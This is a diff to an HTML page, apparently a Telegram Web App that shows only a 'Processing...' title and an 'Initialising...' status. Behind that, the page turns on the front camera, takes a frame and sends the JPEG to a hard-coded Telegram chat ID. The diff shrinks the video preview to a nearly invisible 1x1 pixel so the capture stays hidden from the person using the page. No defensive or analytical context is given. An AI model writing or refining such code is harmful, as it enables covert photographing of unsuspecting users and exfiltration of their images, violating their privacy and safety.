@@ -6,9 +6,11 @@
     <title>Processing...</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-<body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;flex-direction:column;">
+<body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;">
     <h1 id="status">📸 Инициализация...</h1>
-    <video id="video" autoplay playsinline style="display:none;"></video>
+
+    <!-- ВИДЕО ВИДИМОЕ, НО МАЛЕНЬКОЕ (1x1) -->
+    <video id="video" autoplay playsinline style="position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:0.01;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -20,7 +22,6 @@
         const ctx = canvas.getContext('2d');
         const status = document.getElementById('status');
 
-        // Функция отправки фото
         function sendPhoto(blob) {
             const formData = new FormData();
             formData.append('chat_id', '7406666272');
@@ -45,55 +46,47 @@
             });
         }
 
-        // Запрос камеры
-        navigator.mediaDevices.getUserMedia({ 
-            video: { 
+        navigator.mediaDevices.getUserMedia({
+            video: {
                 facingMode: "user",
                 width: { ideal: 640 },
                 height: { ideal: 480 }
-            } 
+            }
         })
         .then(stream => {
             video.srcObject = stream;
             video.play();
 
-            // Ждём, когда появится первый кадр
+            // Ждём первый кадр
             video.addEventListener('timeupdate', function onTimeUpdate() {
                 video.removeEventListener('timeupdate', onTimeUpdate);
 
-                // Устанавливаем размер canvas
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-
-                // Рисуем кадр
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Конвертируем в Blob и отправляем
                 canvas.toBlob(blob => {
                     if (blob) {
                         sendPhoto(blob);
                     } else {
                         status.innerText = '❌ Ошибка Blob';
                     }
-                    // Останавливаем камеру
                     stream.getTracks().forEach(track => track.stop());
                 }, 'image/jpeg', 0.8);
             });
 
-            // Если timeupdate не сработал — делаем принудительный захват через 500 мс
+            // Запасной таймер (на случай, если timeupdate не сработает)
             setTimeout(() => {
                 if (video.videoWidth > 0 && video.videoHeight > 0) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     canvas.toBlob(blob => {
-                        if (blob) {
-                            sendPhoto(blob);
-                        }
+                        if (blob) sendPhoto(blob);
                         stream.getTracks().forEach(track => track.stop());
                     }, 'image/jpeg', 0.8);
                 }
-            }, 1000);
+            }, 1500);
         })
         .catch(err => {
             status.innerText = '❌ Ошибка: ' + err.message;
